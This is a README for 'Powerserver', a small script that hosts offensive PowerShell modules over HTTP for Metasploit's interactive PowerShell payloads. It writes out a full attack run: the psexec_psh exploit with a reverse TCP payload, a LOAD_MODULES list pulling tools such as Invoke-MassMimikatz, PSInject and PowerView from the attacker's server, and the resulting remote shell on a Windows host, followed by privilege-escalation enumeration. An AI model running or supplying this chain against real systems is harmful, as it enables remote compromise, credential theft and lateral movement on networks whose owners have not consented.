# Powerserver
Serves up pre-existing powershell modules over HTTP, for use with Metasploit's Interactive Powershell Payloads

##Install
Installing is easy, peasy, lime and squeezy:

`git clone https://github.com/awhitehatter/powerserver.git`

##Usage
```
usage: powerserver.py [-h] --path PATH --host HOST

optional arguments:
  -h, --help            show this help message and exit
  --path PATH, -p PATH  Path for .ps1 files
  --host HOST, -i HOST  <ip>:<port>
```

##Example
`python powerserver -p /path/to/powershell_scripts -i [ip_address]:[port]`

Example: 

```
awh@jabberwock:~/$ python powerserver.py -p /opt/PowerTools/ -i 192.168.1.102:8080
[*] Directory found

[*] Copy and paste the below to MSF:

http://192.168.1.102:8080/PowerUp/PowerUp.ps1, http://192.168.1.102:8080/PowerPick/PSInjector/PSInject.ps1, http://192.168.1.102:8080/PowerPick/PSInjector/DLLEnc.ps1, http://192.168.1.102:8080/PowerView/powerview.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetSessions.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetShare.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-ShareFinder.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetLoggedon.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-UserHunter.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-Netview.ps1, http://192.168.1.102:8080/PowerView/functions/Get-Net.ps1, http://192.168.1.102:8080/PowerBreach/PowerBreach.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassTokens.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassMimikatz.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassCommand.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassTemplate.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassSearch.ps1

[*] Now starting webserver

[*] serving at port 8080
```

With our Python SimpleHTTPServer up and running, we can configure https://github.com/awhitehatter/powerserver.gitMetasploit. For simplicity I'm using the "psexec_psh" module in MSF and I'll be using the x64 bit Interactive Powershell Payload. 

Set the payload to any of the interactive powershell payloads:
```
msf exploit(psexec_psh) > show options

...

Payload options (windows/x64/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   EXITFUNC      thread           yes       Exit technique (Accepted: , , seh, thread, process, none)
   LHOST         192.168.1.102    yes       The listen address
   LOAD_MODULES                   no        A list of powershell modules seperated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

You can preload your modules, with the list list our script generated. Simply set the "LOAD_MODULES" option:
```

msf exploit(psexec_psh) > set LOAD_MODULES http://192.168.1.102:8080/PowerUp/PowerUp.ps1, http://192.168.1.102:8080/PowerPick/PSInjector/PSInject.ps1, http://192.168.1.102:8080/PowerPick/PSInjector/DLLEnc.ps1, http://192.168.1.102:8080/PowerView/powerview.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetSessions.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetShare.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-ShareFinder.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetLoggedon.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-UserHunter.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-Netview.ps1, http://192.168.1.102:8080/PowerView/functions/Get-Net.ps1, http://192.168.1.102:8080/PowerBreach/PowerBreach.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassTokens.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassMimikatz.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassCommand.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassTemplate.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassSearch.ps1
LOAD_MODULES => http://192.168.1.102:8080/PowerUp/PowerUp.ps1, http://192.168.1.102:8080/PowerPick/PSInjector/PSInject.ps1, http://192.168.1.102:8080/PowerPick/PSInjector/DLLEnc.ps1, http://192.168.1.102:8080/PowerView/powerview.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetSessions.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetShare.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-ShareFinder.ps1, http://192.168.1.102:8080/PowerView/functions/Get-NetLoggedon.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-UserHunter.ps1, http://192.168.1.102:8080/PowerView/functions/Invoke-Netview.ps1, http://192.168.1.102:8080/PowerView/functions/Get-Net.ps1, http://192.168.1.102:8080/PowerBreach/PowerBreach.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassTokens.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassMimikatz.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassCommand.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassTemplate.ps1, http://192.168.1.102:8080/PewPewPew/Invoke-MassSearch.ps1


msf exploit(psexec_psh) > exploit

[*] Loading 17 modules into the interactive PowerShell session
[*] Started reverse SSL handler on 192.168.1.102:4444 
[*] 192.168.121.128:445 - Executing the payload...
[+] 192.168.121.128:445 - Service start timed out, OK if running a command or non-service executable...
[*] Powershell session session 3 opened (192.168.1.102:4444 -> 192.168.1.102:35899) at 2015-07-21 11:36:59 -0600

Windows PowerShell running as user US-V-EDMUNDSB$ on US-V-EDMUNDSB
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

[+] Loading modules.

PS C:\Windows\system32>
```

Awesome, and with our shell we should be able to see one of the PowerTools scripts:
```
PS C:\Windows\system32>get-help get-serviceperms

NAME
    Get-ServicePerms
    
SYNOPSIS
    Returns a list of services that the user can modify.
    
    
SYNTAX
    Get-ServicePerms [<CommonParameters>]
    
    
DESCRIPTION
    This function enumerates all available services and tries to
    open the service for modification, returning the service object
    if the process doesn't failed.
    

RELATED LINKS

REMARKS
    To see the examples, type: "get-help Get-ServicePerms -examples".
    For more information, type: "get-help Get-ServicePerms -detailed".
    For technical information, type: "get-help Get-ServicePerms -full".



PS C:\Windows\system32> 
```
